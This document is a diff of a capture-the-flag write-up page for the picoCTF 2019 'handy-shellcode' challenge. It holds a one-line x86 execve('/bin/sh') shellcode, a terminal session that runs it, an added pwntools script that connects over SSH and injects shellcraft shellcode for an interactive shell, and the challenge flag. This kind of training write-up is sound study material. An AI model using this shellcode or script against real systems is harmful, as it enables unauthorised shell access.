@@ -92,6 +92,8 @@ int main()
   (*(void  (*)()) shellcode)();
 }
 
+</code></pre><p>So we can see that the shellcode just inserts assembly commands onto the stack, and by modifying the control flow of our code to start executing what's on the stack, we can jump into our shell.<p>Fun fact, the following instructions push the string that maps to the path <code>/bin/sh</code> on x86 processors.<pre><code> 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 </code></pre><p>But let's get that shellcode onto one line:<p><code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</code><p>Let's try it?<pre><code class=language-bash>samson@pico-2019-shell1:/problems/handy-shellcode$ ./vuln 
 Enter your shellcode:
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
@@ -126,4 +128,34 @@ jhh///sh/bin��h�4$ri1�QjY�Q��1�j
 Thanks! Executing now...
 cat flag.txt
 picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}
+</code></pre><h2><a class=header href=#alternative-2 id=alternative-2>Alternative 2</a></h2><p>With this alternative, we use pwntools from our local machine to attach and exploit remotely.<p>In this example, we use pwntools to ssh, then send in the prebuilt shellcode, print out the flag, and then drop the user into the shell.<pre><code class=language-python>#!/usr/bin/env python
+from pwn import *
+import sys
+
+REMOTE = True
+
+if __name__ == &quot;__main__&quot;:
+    if REMOTE:
+        s = ssh(host='2019shell1.picoctf.com', user='samson', password=&quot;REDACTED&quot;, port=22)
+        sh = s.process('/problems/handy-shellcode/vuln')
+    else:
+        sh = process(&quot;./vuln&quot;, stdout=process.PTY, stdin=process.PTY)
+
+    sh.sendlineafter(':\n', asm(shellcraft.linux.sh()))
+    sh.sendlineafter('$ ', 'cat /problems/handy-shellcode/flag.txt')
+    sh.interactive()
+</code></pre><pre><code class=language-bash>$ python3.8 exploit.py  
+[+] Connecting to 2019shell1.picoctf.com on port 22: Done
+[*] samson@2019shell1.picoctf.com:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     Enabled
+[+] Starting remote process b'/problems/handy-shellcode/vuln' on 2019shell1.picoctf.com: pid 3796916
+[*] Switching to interactive mode
+picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}$ $ echo &quot;I'm in the shell now&quot;
+I'm in the shell now
+$ $ whoami
+samson
 </code></pre></main><nav class=nav-wrapper aria-label="Page navigation"><a rel=prev href=../../ctf/binary/index.html class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a rel=next href=../../ctf/binary/picoctf19-overflow_0.html class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a><div style=clear:both></div></nav></div></div><nav class=nav-wide-wrapper aria-label="Page navigation"><a href=../../ctf/binary/index.html class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts=Left><i class="fa fa-angle-left"></i></a><a href=../../ctf/binary/picoctf19-overflow_0.html class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts=Right><i class="fa fa-angle-right"></i></a></nav></div><script>window.playpen_copyable=true;</script><script src=../../elasticlunr.min.js></script><script src=../../mark.min.js></script><script src=../../searcher.js></script><script src=../../clipboard.min.js></script><script src=../../highlight.js></script><script src=../../book.js></script><script src=../../theme/mermaid.js></script>
